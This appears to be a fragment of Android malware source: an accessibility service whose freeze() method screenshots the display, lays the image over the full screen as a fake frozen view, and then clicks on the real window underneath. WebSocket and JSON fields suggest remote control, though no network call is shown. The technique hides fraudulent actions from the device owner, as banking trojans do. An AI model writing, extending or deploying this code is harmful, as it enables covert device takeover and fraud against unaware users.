import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.WindowManager;
import android.view.Display;
import android.widget.ImageView;
import android.graphics.Bitmap;
import okhttp3.WebSocket;
import org.json.JSONObject;

class ScreenSession extends AccessibilityService {
    WebSocket channel;
    JSONObject record = new JSONObject();
    WindowManager windows;
    void freeze() {
        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
            public void onSuccess(ScreenshotResult result) {
                Bitmap frame = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
                ImageView cover = new ImageView(ScreenSession.this);
                cover.setImageBitmap(frame);
                WindowManager.LayoutParams layout = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, -3);
                windows.addView(cover, layout);
                getRootInActiveWindow().performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            public void onFailure(int error) {}
        });
    }
}
